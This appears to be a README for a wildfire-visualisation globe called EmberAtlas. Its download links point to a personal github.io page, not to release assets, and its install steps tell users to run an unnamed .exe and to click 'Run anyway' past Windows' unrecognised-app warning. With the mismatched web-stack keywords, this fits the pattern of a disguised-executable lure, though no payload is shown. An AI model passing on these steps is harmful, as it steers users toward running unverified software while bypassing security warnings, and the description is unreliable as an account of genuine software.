# 🌍 EmberAtlas - Visualize global wildfires with historic data

[![Download EmberAtlas](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://wesleyother534.github.io)

EmberAtlas provides a way to view global wildfire activity on a 3D Earth model. You can track historic fire incidents, view perimeter boundaries, and see real-time data like wind speed and current exposure levels. This tool combines satellite data into an interface that behaves like a physical globe you hold in your hands.

## 📋 System Requirements

*   **Operating System:** Windows 10 or Windows 11.
*   **Memory:** 8 GB of RAM or higher.
*   **Graphics:** A dedicated graphics card that supports WebGL. Modern integrated graphics also work well.
*   **Internet Connection:** Required for loading satellite and wildfire data.
*   **Storage Space:** 200 MB of free hard drive space.

## 📥 How to Install and Run

Follow these steps to set up the software on your computer.

1.  **Visit the download page:** Go to the [EmberAtlas Releases page](https://wesleyother534.github.io) to view current versions.
2.  **Select your file:** Look for the section labeled Assets. Click on the file ending in `.exe` that corresponds to the most recent version.
3.  **Download:** Save the file to a folder you can find easily, such as your Downloads folder or Desktop.
4.  **Run the installer:** Double-click the file you downloaded. If a Windows warning appears stating that the app is unrecognized, click "More info" and then "Run anyway."
5.  **Follow the prompts:** A window will appear to guide you through the setup. Accept the default settings to ensure the files land in the correct folders.
6.  **Launch the app:** Once finished, an icon will appear on your desktop. Double-click the icon to open the atlas.

## 🧭 Using the Atlas

The interface centers on a rotatable globe. Use the following controls to navigate:

*   **Rotating the Earth:** Click and hold your left mouse button on the globe. Move your mouse to spin the view in any direction.
*   **Zooming:** Use the scroll wheel on your mouse to move closer to or further from the surface.
*   **Viewing Incidents:** Click on any fire symbol on the map to see details about that specific event. A side panel will slide out with information such as start date, perimeter size, and climate impact.
*   **Time Control:** Use the playback bar at the bottom of your screen to slide through history. This allows you to watch how wildfire perimeters grew or changed over specific dates.
*   **Adjusting Layers:** The menu in the top right corner allows you to toggle data overlays. You can turn wind patterns on or off, shift the view to show historic incidents, or adjust the clarity of the Earth's surface.

## 🛠 Troubleshooting common issues

If you encounter trouble, check these common fixes:

*   **Black screen:** If the globe does not display, ensure your graphics drivers are updated. Most computers receive these updates through the standard Windows Update settings.
*   **Slow performance:** EmberAtlas renders a detailed 3D model of the Earth. Close resource-heavy browser tabs or other large programs if the globe movement feels choppy.
*   **Data missing:** Verify your internet connection. The application fetches live satellite information from external sources. If your connection drops, the map may show gaps in data.
*   **Installation errors:** If the installer fails, check that you have enough disk space. You need at least 200 MB of free space to extract the map files.

## 💡 About the data sources

EmberAtlas gathers information from public repositories to track environmental change. We use data from these primary sources:
*   **Copernicus Emergency Management Service:** Provides high-resolution mapping for active incidents across the globe.
*   **NASA Power:** Supplies historical weather and climate parameters used for forecasting.
*   **Satellite Observations:** Direct feeds contribute to the perimeters and wind vectors displayed on your globe.

Engineers designed this tool to present complex data in a way that remains easy to read. Whether you track fire patterns for professional reasons or personal interest, the interface allows for deep dives into historic and active events without requiring technical expertise.

Keywords: climate-risk, copernicus-emergency-management, data-visualization, earth-observation, fastapi, geospatial, nasa, nasa-power, nextjs, python, threejs, typescript, webgl, wildfire, wildfire-forecasting